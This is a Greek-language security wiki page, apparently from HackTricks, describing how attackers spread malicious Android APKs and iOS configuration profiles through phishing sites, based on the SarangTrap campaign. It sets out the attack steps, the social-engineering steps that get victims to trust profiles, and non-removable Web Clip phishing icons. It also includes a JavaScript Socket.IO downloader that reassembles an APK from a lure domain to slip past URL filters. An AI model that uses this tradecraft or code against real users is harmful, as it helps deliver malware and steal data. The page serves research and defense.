# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Αυτή η σελίδα καλύπτει τεχνικές που χρησιμοποιούν οι απειλητικοί παράγοντες για τη διανομή **κακόβουλων Android APKs** και **iOS mobile-configuration profiles** μέσω phishing (SEO, social engineering, fake stores, dating apps κ.λπ.).
> Το υλικό έχει προσαρμοστεί από την καμπάνια SarangTrap, την οποία αποκάλυψε η Zimperium zLabs (2025), καθώς και από άλλες δημόσιες έρευνες.<sup>[[1]](#references)</sup>

## Ροή επίθεσης

1. **Υποδομή SEO/Phishing**
   * Καταχωρίστε δεκάδες παρόμοια domains (dating, cloud share, car service…).
     – Χρησιμοποιήστε λέξεις-κλειδιά στην τοπική γλώσσα και emojis στο στοιχείο `<title>` για υψηλότερη κατάταξη στο Google.
     – Φιλοξενήστε *τόσο* οδηγίες εγκατάστασης για Android (`.apk`) όσο και για iOS στην ίδια landing page.
2. **Λήψη πρώτου σταδίου**
   * Android: άμεσος σύνδεσμος προς ένα *unsigned* APK ή APK από «third-party store».
   * iOS: σύνδεσμος `itms-services://` ή απλός σύνδεσμος HTTPS προς ένα κακόβουλο **mobileconfig** profile (δείτε παρακάτω).
3. **Συμπεριφορά Android μετά την εγκατάσταση**
   * Η εκτέλεση που εξαρτάται από C2, η κατάχρηση permissions, οι παρακάμψεις dropper, η συλλογή στο παρασκήνιο και άλλες συμπεριφορές malware μετά την εγκατάσταση καλύπτονται στην ειδική σελίδα Android Malware Post-Exploitation παρακάτω.
4. **Τεχνική παράδοσης για iOS**
   * Ένα **mobile-configuration profile** μπορεί να ζητήσει `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` κ.λπ., ώστε να εγγράψει τη συσκευή σε εποπτεία τύπου «MDM».
   * Οδηγίες social engineering:
     1. Ανοίξτε τις Ρυθμίσεις ➜ *Έγινε λήψη προφίλ*.
     2. Πατήστε *Εγκατάσταση* τρεις φορές (με screenshots στη σελίδα phishing).
     3. Εμπιστευτείτε το unsigned profile ➜ ο attacker αποκτά δικαιώματα *Contacts* και *Photo* χωρίς έλεγχο από το App Store.
5. **Payload iOS Web Clip (εικονίδιο εφαρμογής phishing)**
   * Τα payloads `com.apple.webClip.managed` μπορούν να **καρφιτσώσουν ένα URL phishing στην Home Screen** με επώνυμο εικονίδιο/ετικέτα.
   * Τα Web Clips μπορούν να εκτελούνται **σε πλήρη οθόνη** (κρύβοντας το UI του browser) και να οριστούν ως **μη αφαιρούμενα**, αναγκάζοντας το θύμα να διαγράψει το profile για να αφαιρέσει το εικονίδιο.<sup>[[3]](#references)</sup>
6. **Επίπεδο δικτύου**
   * Απλό HTTP, συχνά στη θύρα 80, με HOST header όπως `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (χωρίς TLS → εύκολος εντοπισμός).

## Android Malware Post-Exploitation

Για tradecraft Android malware μετά την εγκατάσταση, όπως C2, κατάχρηση Accessibility, overlays, αυτοματοποίηση ATS, σταδιακή φόρτωση DEX, premium SMS και persistence, δείτε:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK Smuggling μέσω Socket.IO/WebSocket + Fake Google Play Pages

Οι attackers αντικαθιστούν όλο και συχνότερα τους στατικούς συνδέσμους APK με ένα κανάλι Socket.IO/WebSocket ενσωματωμένο σε δελεαστικές σελίδες που μοιάζουν με Google Play. Έτσι αποκρύπτεται το URL του payload, παρακάμπτονται τα φίλτρα URL/extension και διατηρείται μια ρεαλιστική εμπειρία εγκατάστασης.<sup>[[2]](#references)[[4]](#references)</sup>

Συνηθισμένη ροή client που έχει παρατηρηθεί στην πράξη:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Γιατί παρακάμπτει απλούς ελέγχους:
- Δεν εκτίθεται στατικό URL APK· το payload ανασυντίθεται στη μνήμη από frames WebSocket.
- Τα φίλτρα URL/MIME/επέκτασης που αποκλείουν άμεσες αποκρίσεις .apk ενδέχεται να μην εντοπίσουν δυαδικά δεδομένα που διοχετεύονται μέσω WebSockets/Socket.IO.
- Τα crawlers και τα URL sandboxes που δεν εκτελούν WebSockets δεν θα ανακτήσουν το payload.

Δείτε επίσης τεχνικές και εργαλεία WebSocket:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Η σκοτεινή πλευρά του έρωτα: Εκστρατεία εκβιασμού SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Ρυθμίσεις payload Web Clips για συσκευές Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banker Trojan που στοχεύει χρήστες Android στην Ινδονησία και το Βιετνάμ](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
